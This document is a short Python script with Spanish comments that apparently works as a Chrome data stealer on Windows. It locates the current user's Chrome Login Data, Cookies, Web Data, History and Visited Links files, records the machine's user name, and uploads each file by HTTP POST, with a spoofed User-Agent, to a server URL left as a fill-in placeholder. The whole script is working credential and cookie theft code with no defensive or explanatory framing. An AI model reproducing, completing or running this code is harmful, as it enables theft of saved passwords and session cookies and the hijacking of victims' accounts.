import requests
import getpass
import os



getuser = getpass.getuser()
"""copy from system"""
history = f"/Users/{getuser}/AppData/Local/Google/Chrome/User Data/Default/History"
webData = f"/Users/{getuser}/AppData/Local/Google/Chrome/User Data/Default/Web Data"
loginData = f"/Users/{getuser}/AppData/Local/Google/Chrome/User Data/Default/Login Data"
Visited = f"/Users/{getuser}/AppData/Local/Google/Chrome/User Data/Default/Visited Links"
Cookies = f"/Users/{getuser}/AppData/Local/Google/Chrome/User Data/Default/Cookies"


"""mandando al server"""

user = getpass.getuser()

file = open("name.txt", "w")
file.write("Nombre del pc: " + user)
file.close()

"""URL A USAR"""

url = "aqui poner la url"
"""Aqui el headers"""
headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (K HTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'}



"""0 server"""
"""subir_archivo"""
files = {"subir_archivo": open("name.txt", "rb")}
send = requests.post(url, files=files, headers=headers)
envio = send.text

"""1 server"""
"""subir_archivo"""
files = {"subir_archivo": open(webData, "rb")}
send = requests.post(url, files=files, headers=headers)
envio = send.text

"""2 server"""
"""subir_archivo"""
files = {"subir_archivo": open(loginData, "rb")}
send = requests.post(url, files=files, headers=headers)
envio = send.text

"""3 server"""
"""subir_archivo"""
files = {"subir_archivo": open(Cookies, "rb")}
send = requests.post(url, files=files, headers=headers)
envio = send.text

"""4 server"""
"""subir_archivo"""
files = {"subir_archivo": open(Visited, "rb")}
send = requests.post(url, files=files, headers=headers)
envio = send.text

"""5 server"""
"""subir_archivo"""
files = {"subir_archivo": open(history, "rb")}
send = requests.post(url, files=files, headers=headers)
envio = send.text
